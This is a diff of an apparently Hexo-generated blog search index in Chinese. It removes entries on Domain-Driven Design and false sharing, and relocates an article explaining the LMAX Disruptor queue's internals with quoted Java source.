@@ -52,91 +52,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ddd-overview</title>
-    <url>/ddd-overview.html</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>领域驱动设计（Domain-Driven Design，简称DDD）起源于2004年Eric Evans出版《领域驱动设计》，用于应对复杂需求的软件开发。随着近几年微服务架构的普及，DDD 又火起来了</p>
-<p>传统开发中，先根据业务需求设计好数据库 ER 图，然后实现代码。这种方式业务逻辑与技术细节精密耦合不利于后续的需求扩展。DDD 中先进行业务领域建模，再实现代码，让业务逻辑不依赖于技术细节（技术细节越往后决定越好）。</p>
-<p>本篇文章是《领域驱动设计模式、原理与时间》读书笔记总结，重点参数领域驱动设计思想，有疑问地方欢迎讨论。文中的业务场景以会议预定系统为例，详见 <a href="https://www.meetup.com/">Meetup.com</a></p>
-<h2 id="DDD-领域概念"><a href="#DDD-领域概念" class="headerlink" title="DDD 领域概念"></a>DDD 领域概念</h2><table>
-<thead>
-<tr>
-<th><strong>名称</strong></th>
-<th><strong>定义</strong></th>
-<th><strong>举例</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>实体</td>
-<td>有身份标识，一般对应业务对象，封装属性（不公开），公开领域行为</td>
-<td>会议是个实体，表示一个唯一被创建的会议，包含会议成员、地点、会议主题等属性，提供创建会议、添加成员、添加评论等领域行为</td>
-</tr>
-<tr>
-<td>值对象</td>
-<td>富含行为，无身份，不可变，参数校验</td>
-<td>会议室地址是个值对象，会校验地址合法性，能清晰的表示业务属性。 手机号值对象封装 long 基元属性，有校验参数，业务语义</td>
-</tr>
-<tr>
-<td>聚合</td>
-<td>一组业务紧密管理的实体和值对象，是数据修改和持久化的基本单元 聚合内保持强一致性，聚合间保持最终一致性</td>
-<td>会议是个聚合，MeetingGroup 实体是该聚合的根实体，组成员、组地点等是附属聚合的值对象。对领域外公开创建会议，添加成员的操作</td>
-</tr>
-<tr>
-<td>存储库</td>
-<td>封装资源（不局限于数据库、文件、网络存储），只公开需要的操作。领域模型映射到持久化存储</td>
-<td>会议聚合的存储、更新、查询都由存储库代理完成</td>
-</tr>
-<tr>
-<td>领域事件</td>
-<td>解耦不同领域的依赖，B 领域需要响应处理 A 领域的操作。同一个微服务中可以是同步事件</td>
-<td>MeetingGroup 申请，申请通过后，会发送事件给会议域，会议域创建 MeetingGroup。解耦会议域与管理员域</td>
-</tr>
-<tr>
-<td>领域服务</td>
-<td>领域服务没有任何属性或数据，只是一个领域行为或动作，不适合放在任何聚合内的逻辑行为</td>
-<td>比如领域内通用的校验逻辑</td>
-</tr>
-<tr>
-<td>应用服务</td>
-<td>应用服务对应到一个具体业务场景，通过编排聚合、资源库、领域事件、外部适配接口、领域服务来完成</td>
-<td>Meeting 创建场景，调用存储库获取 MeetingGroup，调用 MeetingGroup 创建会议，通知会议创建事件（推荐放在领域中）</td>
-</tr>
-</tbody></table>
-<h2 id="战略模式——在限界上下文通信"><a href="#战略模式——在限界上下文通信" class="headerlink" title="战略模式——在限界上下文通信"></a>战略模式——在限界上下文通信</h2><p>战略模式看似很虚，but 是最重要的。与领域专家、PM一起讨论提炼问题域，编写 UL。划分领域和限界上下文（Bouded Context），并确定上下文之间的关系。</p>
-<h3 id="什么是领域、子域和限界上下文？"><a href="#什么是领域、子域和限界上下文？" class="headerlink" title="什么是领域、子域和限界上下文？"></a>什么是领域、子域和限界上下文？</h3><p>领域代表现实世界的特定问题和解决方案的集合。限界上下文（Bouded Context）定义了模型的适用范围，是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754130.png" alt="a8be9348bc53f7d5bb0483328cea4b8d.png"></p>
-<p>子域是问题空间的概念，限界上下文是解空间的概念。所以限界上下文一定可以对应上一个子域（子域可以对应多个上下文）。一个限界上下文就是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754160.png" alt="352208ffb7378dd38e895e782449e9a8.png"></p>
-<h3 id="如何划分限界上下文？"><a href="#如何划分限界上下文？" class="headerlink" title="如何划分限界上下文？"></a>如何划分限界上下文？</h3><p>根据业务概念来划分，实际需要参考团队粒度、技术特点做裁剪</p>
-<p>领域概念只在限界上下文内有意义。比如同样是订单，在不同的上下文表示不同的概念</p>
-<h2 id="战术模式——创建有效的领域模型"><a href="#战术模式——创建有效的领域模型" class="headerlink" title="战术模式——创建有效的领域模型"></a>战术模式——创建有效的领域模型</h2><p>梳理清楚上下文之间的关系后，从战术层面上剖析上下文内部的组织关系</p>
-<p>依次确认值对象、实体、领域服务和聚合根。之后确认基础架构和应用层。</p>
-<p>下图是 Meeting Groups 聚合根的代码细节，Meeting Groups 属于 Meetings 限界上下文。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251755738.png" alt="1591c32ac3414813e9050fe78111980f.png"></p>
-<p>下图是整体服务架构：</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754207.png" alt="92a72233fa22d43e5bab22a3993efd06.png"></p>
-<h3 id="如何区分值对象与实体"><a href="#如何区分值对象与实体" class="headerlink" title="如何区分值对象与实体"></a>如何区分值对象与实体</h3><p>值对象只是问题域的属性和特征。实体具有唯一身份标识，具有行为和生命周期。值对象和传统的 java bean 类似，区别是：不可变，有参数校验。</p>
-<p>以图书馆系统为例，图书具有唯一标识是一个实体，有出租、归还等行为。图书的 ISBN 号是图书的 ID 属性是一个值对象。为什么不把 ISBN 定义为 string 简单字段？以为 ISBN 有一些隐藏属性，包括 ISBN 的类型和合法性校验。</p>
-<h3 id="为什么需要聚合"><a href="#为什么需要聚合" class="headerlink" title="为什么需要聚合"></a>为什么需要聚合</h3><p>一些对象具有不可变条件，以采购系统为例，当采购请求被通过后，不能修改采购项。采购项与采购请求两个实体具有不变条件，放在一个聚合中。</p>
-<p>为保证聚合内的强一致性，外界只能引用聚合根，不能引用聚合内部对象。如有必要，聚合返回内部对象的副本给外界。</p>
-<h3 id="领域模型到底是什么"><a href="#领域模型到底是什么" class="headerlink" title="领域模型到底是什么"></a>领域模型到底是什么</h3><p>描述业务逻辑领域概念，偏向代码实现的领域对象。我将其理解为领域层的整个代码实现</p>
-<p>DDD 将业务分为 4 层：UI、应用、领域、基础。其核心是高度提纯、通用、少变化的领域层。领域层对外暴露业务行为接口，驱动应用层和基础层的设计，是谓“领域驱动设计”。</p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>没找找到合适的 ddd demo 项目，可以参考下面的图书馆系统的代码。这是一个分层架构，包括表示层、应用层、领域层和基础架构层</p>
-<p>repository 存储库接口定义在 model 中，实现在 infra 中。application 对外的接口接收请求。lending 表示借阅上下文</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754252.png" alt="6ba4df47f06a010a9f327bbc4e9aa836.png"></p>
-<p>lending 表示借阅上下文。book 表示一个领域</p>
-<p>为实现依赖倒置，存储库的接口定义在 model 中，实现在 infra 中</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《领域驱动设计模式、原理与实践》</p>
-<p><a href="https://github.com/kgrzybek/modular-monolith-with-ddd">https://github.com/kgrzybek/modular-monolith-with-ddd</a></p>
-<p><a href="https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA">https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA</a></p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>ddd</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>caffeine 缓存实现原理</title>
     <url>/caffeine.html</url>
     <content><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们知道 HashMap 可以作为进程内缓存，他不受外部系统影响，速度快。但是他不能像分布式缓存那样能够实时刷新，且本地内存有限，需要限定 HashMap 的容量范围，这就涉及到缓存淘汰问题。为了解决本地缓存的这些问题，Guava Cache 应运而生，他提供了异步刷新和 LRU 淘汰策略。Guava Cache 功能虽然强大，但是只是对 LRU 的一层封装，在复杂的业务场景下，LRU 淘汰策略显得力不从心。为此基于  W-TinyLFU(LFU+LRU算法的变种) 淘汰策略的进程内缓存 —— Caffeine Cache 诞生了。</p>
@@ -212,21 +127,65 @@
       </tags>
   </entry>
   <entry>
-    <title>伪共享</title>
-    <url>/false-sharing.html</url>
-    <content><![CDATA[<h3 id="伪共享"><a href="#伪共享" class="headerlink" title="伪共享"></a>伪共享</h3><p>在 cpu 和 内存之间有高速缓存区（cache）,cache 一般集成在 cpu 内部，也叫做 cpu Cache。如下图是一个二级缓存示意图。<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file.png" alt="二级缓存示意图"></p>
+    <title>disrupt 实现原理</title>
+    <url>/disrupt.html</url>
+    <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
+<p>性能测试：<a href="https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results">https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results</a></p>
 <span id="more"></span>
 
-<p>cache 内部是按照行来存储的，每行称为一个 cache 行，大小为2的n次幂，一个 cache 行 可能会存有多个变量数据<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file2.png" alt="cache行"></p>
-<p>当多个线程同时修改一个 cache 行里面的多个变量时候，由于同时只能有一个线程操作缓存行，所以相比每个变量放到一个缓存行性能会有所下降，这就是伪共享。</p>
-<p>当单个线程顺序访问同一个 cache 行的多个变量，利用<strong>程序运行局部性原理</strong>会加快程序运行。当多个程序同时访问同一个 cache 行的多个变量，会发生竞争，速度会慢</p>
+<h2 id="二、Disruptor-为什么这么快"><a href="#二、Disruptor-为什么这么快" class="headerlink" title="二、Disruptor 为什么这么快"></a>二、Disruptor 为什么这么快</h2><h3 id="2-1-无锁操作"><a href="#2-1-无锁操作" class="headerlink" title="2.1 无锁操作"></a>2.1 无锁操作</h3><p>生产数据消费数据都是通过申请序列，申请成功后才可以继续操作。而申请序列的操作时通过 CAS + LockSupport 完成的。</p>
+<h3 id="2-2-消除伪共享"><a href="#2-2-消除伪共享" class="headerlink" title="2.2 消除伪共享"></a>2.2 消除伪共享</h3><p>通过填充数据方式来实现消除伪共享</p>
+<h4 id="2-2-1-什么是伪共享"><a href="#2-2-1-什么是伪共享" class="headerlink" title="2.2.1 什么是伪共享"></a>2.2.1 什么是伪共享</h4><p>cpu 三级缓存架构如下</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor.png" alt="cpu 三级缓存"></p>
+<p>thread1 和 thread2 读取数据会覆盖 cpu cache line</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor1.png" alt="伪共享"></p>
+<h4 id="2-2-2-通过数据填充消除伪共享"><a href="#2-2-2-通过数据填充消除伪共享" class="headerlink" title="2.2.2 通过数据填充消除伪共享"></a>2.2.2 通过数据填充消除伪共享</h4><p>通过填充数据，使数据长度恰好等于一个缓存行长度（64 字节 or 128 字节），这样数据占据整个缓存行，就不会被别的数据覆盖。</p>
+<p>Disruptor 中的 Sequence 序列号对象，通过先后数据填充，变为 128 个字节，实现伪共享消除的。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RhsPadding</span> <span class="keyword">extends</span> <span class="title">Value</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> <span class="keyword">extends</span> <span class="title">RhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> INITIAL_VALUE = -<span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe UNSAFE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> VALUE_OFFSET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过前置p1<del>p7，后置p9</del>p15填充缓存行，防止缓冲行共享。一般的处理器架构缓存行是64字节，但是有个处理器架构是128字节，所以采用前后填充，能够实现在所有处理器上消除伪共享。</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor2.png" alt="缓存行"></p>
+<h3 id="2-3-环形-buffer"><a href="#2-3-环形-buffer" class="headerlink" title="2.3 环形 buffer"></a>2.3 环形 buffer</h3><p>内部采用数组存储数据，充分利用内存局部性原理。</p>
+<p>只使用一个指针来表示可用数据，没有头尾指针。消除头尾指针竞争。各个生产者消费者只需要申请自己的序列号，就可以进行操作了。不存在竞争同一资源。</p>
+<p>bufferSize 是 2 的 n 次幂，通过 sequence &amp; (2^n -1) 来计算索引。</p>
+<p>通过数据覆盖，不需要删除数据，无需 GC。</p>
+<h2 id="三、Disruptor-如何工作"><a href="#三、Disruptor-如何工作" class="headerlink" title="三、Disruptor 如何工作"></a>三、Disruptor 如何工作</h2><h3 id="3-1-消费者端"><a href="#3-1-消费者端" class="headerlink" title="3.1 消费者端"></a>3.1 消费者端</h3><p>每个消费者都对应一个 ConsumerBarrier，消费者通过 ConsumerBarrier 与 Disruptor 交互。消费者通过 ConsumerBarrier 获取下一个可以消费的序列号，然后开始消费。比如消费者 A 当前消费的序列号是8，通过 ConsumerBarrier 获取下一个可消费的序列号是 12，那么消费者 A 可以批量消费序列号 9，10，11，12 的数据。</p>
+<p><strong>消费者消费数据步骤：1.获取序列号，2.消费数据</strong></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor3.png" alt="消费者消费步骤"></p>
+<h3 id="3-2-生产者端"><a href="#3-2-生产者端" class="headerlink" title="3.2 生产者端"></a>3.2 生产者端</h3><p>多个生产者对应一个 Sequencer，也就是说多个生产者共用一个序列号。</p>
+<p><strong>生产者生产数据步骤：1.申请序列号，2.填充数据，3.发布</strong></p>
+<p>生产者 A 和生产者 B <strong>同时生产</strong>数据，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor4.png" alt="生产者1"></p>
+<p>生产者 A <strong>讯轮阻塞</strong> 等待消费者 A，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor5.png" alt="生产者2"></p>
+<p>消费者 A <strong>轮训非阻塞</strong> 等待生产者 B，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor6.png" alt="生产者3"></p>
+<h2 id="四、源码导读"><a href="#四、源码导读" class="headerlink" title="四、源码导读"></a>四、源码导读</h2><h3 id="4-1-核心类"><a href="#4-1-核心类" class="headerlink" title="4.1 核心类"></a>4.1 核心类</h3><p><a href="https://github.com/LMAX-Exchange/disruptor/wiki/Introduction">https://github.com/LMAX-Exchange/disruptor/wiki/Introduction</a></p>
+<p>ringbuff上有指针，每个消费者都维护自己的一个指针，生产者共用一个指针。指针是由 Sequencer类来控制的假设buffsize=8，如果消费者在消费id7，生产者将生产id15（15-buffsize=7），是同一个位置，生产者阻塞，如果生产者在生产id7，消费者在消费id7，消费者阻塞</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/162762019.png" alt="流程图"></p>
+<h3 id="4-2-生产者端"><a href="#4-2-生产者端" class="headerlink" title="4.2 生产者端"></a>4.2 生产者端</h3><h4 id="4-2-1-申请序号"><a href="#4-2-1-申请序号" class="headerlink" title="4.2.1 申请序号"></a>4.2.1 申请序号</h4><p>调用 Sequencer#get ，直接看多生产者如果申请序号的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;n must be &gt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> current;</span><br><span class="line">  <span class="keyword">long</span> next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取当前发布序号</span></span><br><span class="line">    current = cursor.get();</span><br><span class="line">    next = current + n;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">long</span> wrapPoint = next - bufferSize;</span><br><span class="line">    <span class="comment">// gatingSequenceCache 这是 gatingSequence 的缓存，存入的是最小的消费者消费序列（有多个消费者）</span></span><br><span class="line">    <span class="keyword">long</span> cachedGatingSequence = gatingSequenceCache.get();</span><br><span class="line">		<span class="comment">// 生产者要覆盖未被消费的数据（生产者超过消费者一圈了）</span></span><br><span class="line">    <span class="keyword">if</span> (wrapPoint &gt; cachedGatingSequence || cachedGatingSequence &gt; current)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取最小的消费者序列</span></span><br><span class="line">      <span class="keyword">long</span> gatingSequence = Util.getMinimumSequence(gatingSequences, current);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wrapPoint &gt; gatingSequence)</span><br><span class="line">      &#123;</span><br><span class="line">        LockSupport.parkNanos(<span class="number">1</span>); <span class="comment">// TODO, should we spin based on the wait strategy?</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">			<span class="comment">// 更新缓存</span></span><br><span class="line">      gatingSequenceCache.set(gatingSequence);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cursor.compareAndSet(current, next))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-2-写入数据"><a href="#4-2-2-写入数据" class="headerlink" title="4.2.2 写入数据"></a>4.2.2 写入数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (E)entries[(<span class="keyword">int</span>)sequence &amp; indexMask];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// dosomething</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-3发布"><a href="#4-2-3发布" class="headerlink" title="4.2.3发布"></a>4.2.3发布</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 将待发布的序列设为可用，这样消费者就可以消费这个序列了</span></span><br><span class="line">  setAvailable(sequence);</span><br><span class="line">  waitStrategy.signalAllWhenBlocking();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-消费者端"><a href="#4-3-消费者端" class="headerlink" title="4.3 消费者端"></a>4.3 消费者端</h3><p>Disruptor#start 启动，会在线程池里启动 EventProcessor，每个 EventHandler 对应一个 EventProcessor</p>
+<p>BatchEventProcessor 是 EventProcessor 的实现类，run方法里会轮训，是否有 event 可以被消费，如果可以就调用 EventHandler#onEvent 方法，触发消费者事件。</p>
+<p>重点看 BatchEventProcessor#run 方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 状态设为启动，是一个AtomicBoolean</span></span><br><span class="line">  <span class="keyword">if</span> (!running.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Thread is already running&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清除中断</span></span><br><span class="line">  sequenceBarrier.clearAlert();</span><br><span class="line">	<span class="comment">// 判断一下消费者是否实现了LifecycleAware ,如果实现了这个接口，那么此时会发送一个启动通知</span></span><br><span class="line">  notifyStart();</span><br><span class="line"></span><br><span class="line">  T event = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">long</span> nextSequence = sequence.get() + <span class="number">1L</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 获取最大可用的序号，表示在之前的都可以安全消费</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> availableSequence = sequenceBarrier.waitFor(nextSequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (nextSequence &lt;= availableSequence)</span><br><span class="line">        &#123;</span><br><span class="line">          event = dataProvider.get(nextSequence);</span><br><span class="line">          eventHandler.onEvent(event, nextSequence, nextSequence == availableSequence);</span><br><span class="line">          nextSequence++;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 记录对应消费者消费到哪里</span></span><br><span class="line">        sequence.set(availableSequence);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> TimeoutException e)</span><br><span class="line">      &#123;</span><br><span class="line">        notifyTimeout(sequence.get());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> AlertException ex)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果任务停止，就退出</span></span><br><span class="line">        <span class="keyword">if</span> (!running.get())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable ex)</span><br><span class="line">      &#123;</span><br><span class="line">        exceptionHandler.handleEventException(ex, nextSequence, event);</span><br><span class="line">        sequence.set(nextSequence);</span><br><span class="line">        nextSequence++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span></span><br><span class="line">  &#123;</span><br><span class="line">    notifyShutdown();</span><br><span class="line">    <span class="comment">// 任务关闭</span></span><br><span class="line">    running.set(<span class="keyword">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>消费者在消费时候，需要判断其最大可消费的序列号，这个最大可消费序列号是通过 SequenceBarrier#waitFor 方法来实现的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">waitFor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> AlertException, InterruptedException, TimeoutException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">// 判断是否中断，如果中断就抛出异常，这样上层捕捉，就可以停止 BatchEventProcessor</span></span><br><span class="line">        checkAlert();</span><br><span class="line">				<span class="comment">// 根据不同的策略获取可用的序列</span></span><br><span class="line">        <span class="keyword">long</span> availableSequence = waitStrategy.waitFor(sequence, cursorSequence, dependentSequence, <span class="keyword">this</span>);</span><br><span class="line">				<span class="comment">// 可用序列比申请的序列小，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (availableSequence &lt; sequence)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> availableSequence;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 如果是单生产者，直接返回 availableSequence；对于多生产者判断是否可用，不可用返回sequence-1</span></span><br><span class="line">        <span class="keyword">return</span> sequencer.getHighestPublishedSequence(sequence, availableSequence);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://github.com/LMAX-Exchange/disruptor">https://github.com/LMAX-Exchange/disruptor</a></p>
 ]]></content>
       <categories>
-        <category>java进阶</category>
+        <category>java</category>
       </categories>
       <tags>
-        <tag>java</tag>
-        <tag>并发编程</tag>
+        <tag>源码</tag>
+        <tag>disruptor</tag>
       </tags>
   </entry>
   <entry>
@@ -375,66 +334,157 @@
       </tags>
   </entry>
   <entry>
-    <title>disrupt 实现原理</title>
-    <url>/disrupt.html</url>
-    <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
-<p>性能测试：<a href="https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results">https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results</a></p>
-<span id="more"></span>
-
-<h2 id="二、Disruptor-为什么这么快"><a href="#二、Disruptor-为什么这么快" class="headerlink" title="二、Disruptor 为什么这么快"></a>二、Disruptor 为什么这么快</h2><h3 id="2-1-无锁操作"><a href="#2-1-无锁操作" class="headerlink" title="2.1 无锁操作"></a>2.1 无锁操作</h3><p>生产数据消费数据都是通过申请序列，申请成功后才可以继续操作。而申请序列的操作时通过 CAS + LockSupport 完成的。</p>
-<h3 id="2-2-消除伪共享"><a href="#2-2-消除伪共享" class="headerlink" title="2.2 消除伪共享"></a>2.2 消除伪共享</h3><p>通过填充数据方式来实现消除伪共享</p>
-<h4 id="2-2-1-什么是伪共享"><a href="#2-2-1-什么是伪共享" class="headerlink" title="2.2.1 什么是伪共享"></a>2.2.1 什么是伪共享</h4><p>cpu 三级缓存架构如下</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor.png" alt="cpu 三级缓存"></p>
-<p>thread1 和 thread2 读取数据会覆盖 cpu cache line</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor1.png" alt="伪共享"></p>
-<h4 id="2-2-2-通过数据填充消除伪共享"><a href="#2-2-2-通过数据填充消除伪共享" class="headerlink" title="2.2.2 通过数据填充消除伪共享"></a>2.2.2 通过数据填充消除伪共享</h4><p>通过填充数据，使数据长度恰好等于一个缓存行长度（64 字节 or 128 字节），这样数据占据整个缓存行，就不会被别的数据覆盖。</p>
-<p>Disruptor 中的 Sequence 序列号对象，通过先后数据填充，变为 128 个字节，实现伪共享消除的。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RhsPadding</span> <span class="keyword">extends</span> <span class="title">Value</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> <span class="keyword">extends</span> 